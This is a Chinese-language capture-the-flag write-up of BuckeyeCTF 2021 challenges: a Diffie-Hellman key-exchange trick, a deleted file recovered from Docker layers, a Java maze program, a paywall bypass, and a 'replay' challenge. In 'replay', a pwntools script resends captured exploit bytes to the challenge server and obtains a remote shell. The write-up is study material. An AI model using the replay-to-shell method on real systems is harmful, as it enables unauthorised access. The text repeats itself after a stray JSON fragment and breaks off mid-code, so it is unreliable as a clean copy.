0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8 plaintext = cipher.decrypt(cun.long_to_bytes(message)) print(plaintext) decrypt() flag:buckeye&#123;DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?&#125; layersCheck out my brand new docker repo https://hub.docker.com/r/qxxxb/layers 查看镜像历史,发现曾经存在一个flag.png,但是被删除了 [root@VM-8-4-centos ~] docker history qxxxb/layers IMAGE CREATED CREATED BY SIZE COMMENT 0c01a25ae5b7 5 days ago /bin/sh -c echo &quot;Sorry, the flag has been de… 36B &lt;missing&gt; 5 days ago /bin/sh -c rm flag.png 0B &lt;missing&gt; 5 days ago /bin/sh -c #(nop) COPY multi:6b3bd56201fda03… 599kB &lt;missing&gt; 8 weeks ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot;] 0B &lt;missing&gt; 8 weeks ago /bin/sh -c #(nop) ADD file:aad4290d27580cc1a… 5.6MB 使用docker save将镜像保存成tar包并解压,然后再解压每一层文件夹中中的layer.tar找到flag.png [root@VM-8-4-centos ~] docker save qxxxb/layers -o a.tar [root@VM-8-4-centos ~]# tar xvf a.tar 0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9.json 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/ 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/VERSION 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/json 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/ 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/VERSION 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/json 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/layer.tar c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/ c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/VERSION c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/json c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/layer.tar c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/ c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/VERSION c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/json c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/layer.tar manifest.json repositories [root@VM-8-4-centos ~]# tar xvf 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar Dockerfile flag.png flag:buckeye&#123;D0CK3R_H4S_L4Y3RS&#125; replaySomebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on misc.chall.pwnoh.io on port 13371. Can you pwn it for me? 使用Wireshark分析replay.pcap文件,跟踪TCP流,发现似乎是发送了一些数据拿到Shell权限后,执行了一些命令. 对着“Data”右键,选择“导出分组字节流”,保存字节流数据至a.bin 编写脚本,使用pwn连接服务器并发送数据,执行shell命令,找到flag.txt文件 ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ python a.py [+] Opening connection to misc.chall.pwnoh.io on port 13371: Done [*] Switching to interactive mode $ ls chall flag.txt $ cat flag.txt buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125; 代码: from pwn import * p = remote(&#39;misc.chall.pwnoh.io&#39;, 13371) p.recvuntil(b&#39;TODAY&#39;, drop=True) p.recvline() with open(&#39;a.bin&#39;,&#39;rb&#39;) as f: data = f.read() p.send(data) p.interactive() p.close() flag:buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125; ButtonsAnyone taken Software 1? Can you help me figure out what this weird Java program does? 用javadecompilers反编译Buttons.jar得到源码. 观察到有一个printFlag函数,但是依赖于moveHistory,所以不能通过直接运行printFlag来得到flag. 分析调用printFlag函数的actionPerformed,发现:只有当前点击的方格是isLegalMove的时候,才会被加到moveHistory里;当前点击的方格是最后一个时就会打印出flag. 继续分析isLegalMove函数,发现该函数返回为True时必须满足grid[n][n2] == 0. 那么我们可以在初始化的时候,将所有满足grid[n][n2] == 0的方格设为🏁,然后依次点击显示为🏁的方格即可. this.buttons[i][j] = new JButton(&quot;?&quot;); if(this.grid[i][j] == 0)&#123; this.buttons[i][j].setText(&quot;\\u2691&quot;); &#125; 使用javac命令将源代码编译为Java字节码文件并运行. ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ javac Buttons.java 注: Buttons.java使用了未经检查或不安全的操作。 注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。 ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ java Buttons 代码 /* * Decompiled with CFR 0.150. */ import java.awt.Dimension; import java.awt.GridLayout; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.math.BigInteger; import java.nio.charset.StandardCharsets; import java.util.ArrayList; import javax.swing.BoxLayout; import javax.swing.JButton; import javax.swing.JFrame; import javax.swing.JLabel; import javax.swing.JOptionPane; import javax.swing.JPanel; public final class Buttons extends JFrame implements ActionListener &#123; private static final int[][] grid = new int[][]&#123; &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1&#125;, &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;, &#123;1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1&#125;, &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;, &#123;1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;, &#123;1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125; &#125;; private final int rows; private final int cols; private final JLabel movesLabel; private final JButton resetButton; private final JButton[][] buttons; private int posRow; private int posCol; private final int endRow; private final int endCol; private static final int MAX_MOVES = 139; private ArrayList&lt;Integer&gt; moveHistory; public static void main(String[] arrstring) throws Exception &#123; new Buttons(); &#125; public Buttons() &#123; super(&quot;Buttons!&quot;); this.resetValues(); this.rows = grid.length; this.cols = grid[0].length; this.endRow = this.rows - 1; this.endCol = this.cols - 2; JPanel jPanel = new JPanel(); jPanel.setLayout(new BoxLayout(jPanel, 3)); JPanel jPanel2 = new JPanel(new GridLayout(this.rows, this.cols)); JPanel jPanel3 = new JPanel(); this.buttons = new JButton[this.rows][this.cols]; for (int i = 0; i &lt; this.rows; ++i) &#123; for (int j = 0; j &lt; this.cols; ++j) &#123; this.buttons[i][j] = new JButton(&quot;?&quot;); if(this.grid[i][j] == 0) &#123; this.buttons[i][j].setText(&quot;\\u2691&quot;); &#125; this.buttons[i][j].addActionListener(this); this.buttons[i][j].setActionCommand(Integer.toString(j + i * this.cols)); jPanel2.add(this.buttons[i][j]); &#125; &#125; this.buttons[this.endRow][this.endCol].setText(&quot;\\u2691&quot;); jPanel2.setPreferredSize(new Dimension(45 * this.rows, 45 * this.cols)); this.movesLabel = new JLabel(&quot;Moves left: 20&quot;); jPanel3.add(this.movesLabel); this.resetButton = new JButton(&quot;Reset&quot;); this.resetButton.addActionListener(this); this.resetButton.setActionCommand(&quot;reset&quot;); jPanel3.add(this.resetButton); jPanel.add(jPanel2); jPanel.add(jPanel3); this.resetGUI(); this.getContentPane().add(jPanel); this.pack(); this.setDefaultCloseOperation(3); this.setVisible(true); &#125; private void resetValues() &#123; this.posRow = 0; this.posCol = 1; this.moveHistory = new ArrayList(); this.moveHistory.add(this.posCol + this.posRow * this.cols); &#125; private void updateMovesLeft() &#123; this.movesLabel.setText(&quot;Moves left: &quot; + Integer.toString(139 - this.moveHistory.size())); &#125; private void resetGUI() &#123; for (int i = 0; i &lt; this.rows; ++i) &#123; for (int j = 0; j &lt; this.cols; ++j) &#123; this.buttons[i][j].setEnabled(true); &#125; &#125; for (int j : this.moveHistory) &#123; int n = j / this.cols; int n2 = j % this.cols; this.buttons[n][n2].setEnabled(false); &#125; this.updateMovesLeft(); &#125; private void reset() &#123; this.resetValues(); this.resetGUI(); &#125; private boolean isLegalMove(int n, int n2) &#123; if (139 - this.moveHistory.size() &lt;= 0) &#123; return false; &#125; return grid[n][n2] == 0 &amp;&amp; Math.abs(n - this.posRow) + Math.abs(n2 - this.posCol) == 1; &#125; private void printFlag() &#123; BigInteger bigInteger; BigInteger[] arrbigInteger = new BigInteger[this.moveHistory.size()]; arrbigInteger[0] = BigInteger.valueOf(2L); for (int i = 1; i &lt; arrbigInteger.length; ++i) &#123; arrbigInteger[i] = arrbigInteger[i - 1].nextProbablePrime(); &#125; BigInteger bigInteger2 = BigInteger.valueOf(1L); BigInteger bigInteger3 = new BigInteger(&quot;1430313837704837266267655033918654049072573502772041995300810633148485540425442305963378206448908414865491202671058946396326575688430628383447817933039379&quot;); for (int i = 0; i &lt; this.moveHistory.size(); ++i) &#123; bigInteger = BigInteger.valueOf(this.moveHistory.get(i).intValue()); bigInteger2 = bigInteger2.multiply(arrbigInteger[i].modPow(bigInteger, bigInteger3)).mod(bigInteger3); &#125; BigInteger bigInteger4 = new BigInteger(&quot;1181624346478884506978387685027501257422054115549381320819711748725513305918055802813085700551988448885328987653245675378090761255233757606571908411691314&quot;); bigInteger = bigInteger4.multiply(bigInteger2).mod(bigInteger3); byte[] arrby = bigInteger.toByteArray(); String string = new String(arrby, StandardCharsets.UTF_8); JOptionPane.showMessageDialog(this, &quot;Congrats! The flag is: &quot; + string, &quot;Flag&quot;, 1); System.out.println(string); &#125; @Override public void actionPerformed(ActionEvent actionEvent) &#123; String string = actionEvent.getActionCommand(); if (string.equals(&quot;reset&quot;)) &#123; this.reset(); &#125; else &#123; int n; int n2 = Integer.parseInt(string); int n3 = n2 / this.cols; if (this.isLegalMove(n3, n = n2 % this.cols)) &#123; this.buttons[n3][n].setEnabled(false); this.posRow = n3; this.posCol = n; this.moveHistory.add(n2); System.out.println(this.moveHistory); this.updateMovesLeft(); if (this.posRow == this.endRow &amp;&amp; this.posCol == this.endCol) &#123; this.printFlag(); &#125; &#125; else &#123; JOptionPane.showMessageDialog(this, &quot;Illegal move, you lose \\u2639&quot;, &quot;Illegal move&quot;, 0); this.reset(); &#125; &#125; &#125; &#125; flag:buckeye&#123;am4z1ng_j0b_y0u_b1g_j4va_h4ck3r&#125; pay2winKyle started an online magazine (The Daily Kyle) and published one of my articles on his site. Don’t worry, the article literally contains the flag in plaintext, but if you want to read it you’ll have to figure out how to bypass the paywall. URL: https://pay2win.chall.pwnoh.io 查看网页源代码,发现plantFlag函数,粘贴到Console中运行后,打印出shwl_l1_twcd14&#125;1ry4ht3neck_t3_bs&#123;1c_hkh_tsh3he03gy_3l_hu. const ciphertext = [ 234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152, 125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55, 173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61, ]; const plaintext = ciphertext.map((x, i) =&gt; (i * i) % 256 ^ x ^ 0x99); const flagElement = document.querySelector(&quot;#flag&quot;); plaintext.map((x, i) =&gt; &#123; const span = document.createElement(&quot;span&quot;); span.classList.add(`flag-char-$&#123;i&#125;`); span.textContent = String.fromCharCode(x); flagElement.appendChild(span); return span; &#125;); 查看main.css,发现span都被设置了order属性. 我们可以把main.css,main.js和网页源代码a.html下载到本地.然后注释掉main.js里弹窗和阻止滚动的代码. 打开a.html,发现本应该显示flag的地方有一个灰色的框. 编辑a.html,将 &lt;code id=&quot;flag&quot;&gt;&lt;/code&gt;这一行代码移动至&lt;pre&gt;标签外面,即可看到flag. flag:buckeye&#123;h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3&#125;","summary":"Key ExchangeLet’s exchange the flag (securely):nc crypto.chall.pwnoh.io 13374 分析给出的代码,发现当输入的B等于g的时候,A的值即为shared_secret,从而可以得到AES密钥,解密后即可得到flag. 使用nc连接服务器: ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ nc crypto.chall.pwnoh.io 13374 I&#39;m going to send you the flag. However, I noticed that an FBI agent has been eavesdropping on my messages, so I&#39;m going to send it to you in a way that ONLY YOU can decrypt the flag. p = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351 g = 5 A = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180 Give me your public key B: 5 ciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8 代码 def decrypt(): shared_secret = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180 key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) message = 0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8 plaintext = cipher.decrypt(cun.long_to_bytes(message)) print(plaintext) decrypt() flag:buckeye&#123;DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?&#125; layersCheck out my brand new docker repo https://hub.docker.com/r/qxxxb/layers 查看镜像历史,发现曾经存在一个flag.png,但是被删除了 [root@VM-8-4-centos ~] docker history qxxxb/layers IMAGE CREATED CREATED BY SIZE COMMENT 0c01a25ae5b7 5 days ago /bin/sh -c echo &quot;Sorry, the flag has been de… 36B &lt;missing&gt; 5 days ago /bin/sh -c rm flag.png 0B &lt;missing&gt; 5 days ago /bin/sh -c #(nop) COPY multi:6b3bd56201fda03… 599kB &lt;missing&gt; 8 weeks ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot;] 0B &lt;missing&gt; 8 weeks ago /bin/sh -c #(nop) ADD file:aad4290d27580cc1a… 5.6MB 使用docker save将镜像保存成tar包并解压,然后再解压每一层文件夹中中的layer.tar找到flag.png [root@VM-8-4-centos ~] docker save qxxxb/layers -o a.tar [root@VM-8-4-centos ~]# tar xvf a.tar 0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9.json 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/ 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/VERSION 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/json 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/ 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/VERSION 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/json 8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/layer.tar c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/ c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/VERSION c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/json c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/layer.tar c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/ c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/VERSION c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/json c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/layer.tar manifest.json repositories [root@VM-8-4-centos ~]# tar xvf 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar Dockerfile flag.png flag:buckeye&#123;D0CK3R_H4S_L4Y3RS&#125; replaySomebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on misc.chall.pwnoh.io on port 13371. Can you pwn it for me? 使用Wireshark分析replay.pcap文件,跟踪TCP流,发现似乎是发送了一些数据拿到Shell权限后,执行了一些命令. 对着“Data”右键,选择“导出分组字节流”,保存字节流数据至a.bin 编写脚本,使用pwn连接服务器并发送数据,执行shell命令,找到flag.txt文件 ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ python a.py [+] Opening connection to misc.chall.pwnoh.io on port 13371: Done [*] Switching to interactive mode $ ls chall flag.txt $ cat flag.txt buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125; 代码: from pwn import * p = remote(&#39;misc.chall.pwnoh.io&#39;, 13371) p.recvuntil(b&#39;TODAY&#39;, drop=True) p.recvline() with open(&#39;a.bin&#39;,&#39;rb&#39;) as f: data = f.read() p.send(data) p.interactive() p.close() flag:buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125; ButtonsAnyone taken Software 1? Can you help me figure out what this weird Java program does? 用javadecompilers反编译Buttons.jar得到源码. 观察到有一个printFlag函数,但是依赖于moveHistory,所以不能通过直接运行printFlag来得到flag. 分析调用printFlag函数的actionPerformed,发现:只有当前点击的方格是isLegalMove的时候,才会被加到moveHistory里;当前点击的方格是最后一个时就会打印出flag. 继续分析isLegalMove函数,发现该函数返回为True时必须满足grid[n][n2] == 0. 那么我们可以在初始化的时候,将所有满足grid[n][n2] == 0的方格设为🏁,然后依次点击显示为🏁的方格即可. this.buttons[i][j] = new JButton(&quot;?&quot;); if(this.grid[i][j] == 0)&#123; this.buttons[i][j].setText(&quot;\\u2691&quot;); &#125; 使用javac命令将源代码编译为Java字节码文件并运行. ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ javac Buttons.java 注: Buttons.java使用了未经检查或不安全的操作。 注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。 ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ java Buttons 代码 /* * Decompiled with CFR 0.150. */ import java.awt.Dimension; import java.awt.GridLayout; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.math.BigInteger; import java.nio.charset.StandardCharsets; import java.util.ArrayList; import javax.swing.BoxLayout; import javax.swing.JButton; import javax.swing.JFrame; import javax.swing.JLabel; import javax.swing.JOptionPane; import javax.swing.JPanel; public final class Buttons extends JFrame implements ActionListener &#123; private static final int[][] grid = new int[][]&#123; &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1&#125;, &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;, &#123;1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1&#125;, &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;, &#123;1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1&#125;, &#123;1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;, &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1&#125;, &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;, &#123;1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125; &#125;; private final int rows; private final int cols; private final JLabel movesLabel; private final JButton resetButton; private final JButton[][] buttons; private int posRow; private int posCol; private final int endRow; private final int endCol; private static final int MAX_MOVES = 139; private ArrayList&lt;Integer&gt; moveHistory; public static void main(String[] arrstring) throws Exception &#123; new Buttons(); &#125; public Buttons() &#123; super(&quot;Buttons!&quot;); this.resetValues(); this.rows = grid.length; this.cols = grid[0].length; this.endRow = this.rows - 1; this.endCol = this.cols - 2; JPanel jPanel = new JPanel(); jPanel.setLayout(new BoxLayout(jPanel, 3)); JPanel jPanel2 = new JPanel(new GridLayout(this.rows, this.cols)); JPanel jPanel3 = new JPanel(); this.buttons = new JButton[this.rows][this.cols]; for (int i = 0; i &lt; this.rows; ++i) &#123; for (int j = 0; j &lt; this.cols; ++j) &#123; this.buttons[i][j] = new JButton(&quot;?&quot;); if(this.grid[i][j] == 0) &#123; this.buttons[i][j].setText(&quot;\\u2691&quot;); &#125; this.buttons[i][j].addActionListener(this); this.buttons[i][j].setActionCommand(Integer.toString(j + i * this.cols)); jPanel2.add(this.buttons[i][j]); &#125; &#125; this.buttons[this.endRow][this.endCol].setText(&quot;\\u2691&quot;); jPanel2.setPreferredSize(new Dimension(45 * this.rows, 45 * this.cols)); this.movesLabel = new JLabel(&quot;Moves left: 20&quot;); jPanel3.add(this.movesLabel); this.resetButton = new JButton(&quot;Reset&quot;); this.resetButton.addActionListener(this); this.resetButton.setActionCommand(&quot;reset&quot;); jPanel3.add(this.resetButton); jPanel.add(jPanel2); jPanel.add(jPanel3); this.resetGUI(); this.getContentPane().add(jPanel); this.pack(); this.setDefaultCloseOperation(3); this.setVisible(true); &#125; private void resetValues() &#123; this.posRow = 0; this.posCol = 1; this.moveHistory = new ArrayList(); this.moveHistory.add(this.posCol + this.posRow * this.cols); &#125; private void updateMovesLeft() &#123; this.movesLabel.setText(&quot;Moves left: &quot; + Integer.toString(139 - this.moveHistory.size())); &#125; private void resetGUI() &#123; for (int i = 0; i &lt; this.rows; ++i) &#123; for (int j = 0; j &lt; this.cols; ++j) &#123; this.buttons[i][j].setEnabled(true); &#125; &#125; for (int j : this.moveHistory) &#123; int n = j / this.cols; int n2 = j % this.cols; this.buttons[n][n2].setEnabled(false); &#125; this.updateMovesLeft(); &#125; private void reset() &#123; this.resetValues(); this.resetGUI(); &#125; private boolean isLegalMove(int n, int n2) &#123; if (139 - this.moveHistory.size() &lt;= 0) &#123; return false; &#125; return grid[n][n2] == 0 &amp;&amp; Math.abs(n - this.posRow) + Math.abs(n2 - this.posCol) == 1; &#125; private void printFlag() &#123; BigInteger bigInteger; BigInteger[] arrbigInteger = new BigInteger[this.moveHistory.size()]; arrbigInteger[0] = BigInteger.valueOf(2L); for (int i = 1; i &lt; arrbigInteger.length; ++i) &#123; arrbigInteger[i] = arrbigInteger[i - 1].nextProbablePrime(); &#125; BigInteger bigInteger2 = BigInteger.valueOf(1L); BigInteger bigInteger3 = new BigInteger(&quot;1430313837704837266267655033918654049072573502772041995300810633148485540425442305963378206448908414865491202671058946396326575688430628383447817933039379&quot;); for (int i = 0; i &lt; this.moveHistory.size(); ++i) &#123; bigInteger = BigInteger.valueOf(this.moveHistory.get(i).intValue()); bigInteger2 = bigInteger2.multiply(arrbigInteger[i].modPow(bigInteger, bigInteger3)).mod(bigInteger3); &#125; BigInteger bigInteger4 = new BigInteger(&quot;1181624346478884506978387685027501257422054115549381320819711748725513305918055802813085700551988448885328987653245675378090761255233757606571908411691314&quot;); bigInteger = bigInteger4.multiply(bigInteger2).mod(bigInteger3); byte[] arrby = bigInteger.toByteArray(); String string = new String(arrby, StandardCharsets.UTF_8); JOptionPane.showMessageDialog(this, &quot;Congrats! The flag is: &quot; + string, &quot;Flag&quot;, 1); System.out.println(string); &#125; @Override public void actionPerformed(ActionEvent actionEvent) &#123; String string = actionEvent.getActionCommand(); if (string.equals(&quot;reset&quot;)) &#123; this.reset(); &#125; else &#123; int n; int n2 = Integer.parseInt(string); int n3 = n2 / this.cols; if (this.isLegalMove(n3, n = n2 % this.cols)) &#123; this.buttons[n3][n].setEnabled(false); this.posRow = n3; this.posCol = n; this.moveHistory.add(n2); System.out.println(this.moveHistory); this.updateMovesLeft(); if (this.posRow == this.endRow &amp;&amp; this.posCol == this.endCol) &#123; this.printFlag(); &#125; &#125; else &#123; JOptionPane.showMessageDialog(this, &quot;Illegal move, you lose \\u2639&quot;, &quot;Illegal move&quot;, 0); this.reset(); &#125; &#125; &#125; &#125; flag:buckeye&#123;am4z1ng_j0b_y0u_b1g_j4va_h4ck3r&#125; pay2winKyle started an online magazine (The Daily Kyle) and published one of my articles on his site. Don’t worry, the article literally contains the flag in plaintext, but if you want to read it you’ll have to figure out how to bypass the paywall. URL: https://pay2win.chall.pwnoh.io 查看网页源代码,发现plantFlag函数,粘贴到Console中运行后,打印出shwl_l1_twcd14&#125;1ry4ht3neck_t3_bs&#123;1c_hkh_tsh3he03gy_3l_hu. const ciphertext = [ 234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152, 125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55, 173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61, ]; const plaintext = ciphertext.map((x, i) =&gt; (i * i) % 256 ^ x ^ 0x99); const flagElement = document.querySelector(&quot;#flag&quot;); plaintext.map((x, i) =&gt; &#123; const span = document.createElement(&quot;span&quot;); 